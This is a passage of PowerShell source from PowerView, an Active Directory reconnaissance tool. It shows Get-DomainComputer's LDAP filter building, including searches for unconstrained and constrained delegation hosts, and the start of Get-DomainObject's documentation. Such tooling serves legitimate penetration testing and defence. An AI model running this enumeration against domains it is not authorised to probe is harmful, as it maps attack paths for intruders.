$Properties,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]","        [String]","        $SecurityMasks,","","        [Switch]","        $Tombstone,","","        [Alias('ReturnOne')]","        [Switch]","        $FindOne,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty,","","        [Switch]","        $Raw","    )","","    DynamicParam {","        $UACValueNames = [Enum]::GetNames($UACEnum)","        # add in the negations","        $UACValueNames = $UACValueNames | ForEach-Object {$_; \"NOT_$_\"}","        # create new dynamic parameter","        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])","    }","","    BEGIN {","        $SearcherArguments = @{}","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","        $CompSearcher = Get-DomainSearcher @SearcherArguments","    }","","    PROCESS {","        #bind dynamic parameter to a friendly variable","        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {","            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters","        }","","        if ($CompSearcher) {","            $IdentityFilter = ''","            $Filter = ''","            $Identity | Where-Object {$_} | ForEach-Object {","                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')","                if ($IdentityInstance -match '^S-1-') {","                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"","                }","                elseif ($IdentityInstance -match '^CN=') {","                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"","                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {","                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname","                        #   and rebuild the domain searcher","                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'","                        Write-Verbose \"[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"","                        $SearcherArguments['Domain'] = $IdentityDomain","                        $CompSearcher = Get-DomainSearcher @SearcherArguments","                        if (-not $CompSearcher) {","                            Write-Warning \"[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'\"","                        }","                    }","                }","                elseif ($IdentityInstance.Contains('.')) {","                    $IdentityFilter += \"(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))\"","                }","                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {","                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''","                    $IdentityFilter += \"(objectguid=$GuidByteString)\"","                }","                else {","                    $IdentityFilter += \"(name=$IdentityInstance)\"","                }","            }","            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {","                $Filter += \"(|$IdentityFilter)\"","            }","","            if ($PSBoundParameters['Unconstrained']) {","                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'","                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'","            }","            if ($PSBoundParameters['TrustedToAuth']) {","                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'","                $Filter += '(msds-allowedtodelegateto=*)'","            }","            if ($PSBoundParameters['Printers']) {","                Write-Verbose '[Get-DomainComputer] Searching for printers'","                $Filter += '(objectCategory=printQueue)'","            }","            if ($PSBoundParameters['SPN']) {","                Write-Verbose \"[Get-DomainComputer] Searching for computers with SPN: $SPN\"","                $Filter += \"(servicePrincipalName=$SPN)\"","            }","            if ($PSBoundParameters['OperatingSystem']) {","                Write-Verbose \"[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem\"","                $Filter += \"(operatingsystem=$OperatingSystem)\"","            }","            if ($PSBoundParameters['ServicePack']) {","                Write-Verbose \"[Get-DomainComputer] Searching for computers with service pack: $ServicePack\"","                $Filter += \"(operatingsystemservicepack=$ServicePack)\"","            }","            if ($PSBoundParameters['SiteName']) {","                Write-Verbose \"[Get-DomainComputer] Searching for computers with site name: $SiteName\"","                $Filter += \"(serverreferencebl=$SiteName)\"","            }","            if ($PSBoundParameters['LDAPFilter']) {","                Write-Verbose \"[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter\"","                $Filter += \"$LDAPFilter\"","            }","            # build the LDAP filter for the dynamic UAC filter value","            $UACFilter | Where-Object {$_} | ForEach-Object {","                if ($_ -match 'NOT_.*') {","                    $UACField = $_.Substring(4)","                    $UACValue = [Int]($UACEnum::$UACField)","                    $Filter += \"(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))\"","                }","                else {","                    $UACValue = [Int]($UACEnum::$_)","                    $Filter += \"(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)\"","                }","            }","","            $CompSearcher.filter = \"(\u0026(samAccountType=805306369)$Filter)\"","            Write-Verbose \"[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)\"","","            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }","            else { $Results = $CompSearcher.FindAll() }","            $Results | Where-Object {$_} | ForEach-Object {","                $Up = $True","                if ($PSBoundParameters['Ping']) {","                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname","                }","                if ($Up) {","                    if ($PSBoundParameters['Raw']) {","                        # return raw result objects","                        $Computer = $_","                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')","                    }","                    else {","                        $Computer = Convert-LDAPProperty -Properties $_.Properties","                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')","                    }","                    $Computer","                }","            }","            if ($Results) {","                try { $Results.dispose() }","                catch {","                    Write-Verbose \"[Get-DomainComputer] Error disposing of the Results object: $_\"","                }","            }","            $CompSearcher.dispose()","        }","    }","}","","","function Get-DomainObject {","\u003c#",".SYNOPSIS","","Return all (or specified) domain objects in AD.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  ","",".DESCRIPTION","","Builds a directory searcher object using Get-DomainSearcher, builds a custom","LDAP filter based on targeting/filter parameters, and searches for all objects","matching the criteria. To only return specific properties, use","\"-Properties samaccountname,usnchanged,...\". By default, all objects for","the current domain are returned.","",".PARAMETER Identity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).","Wildcards accepted.","",".PARAMETER UACFilter","","Dynamic parameter that accepts one or more values from $UACEnum, including","\"NOT_X\" ne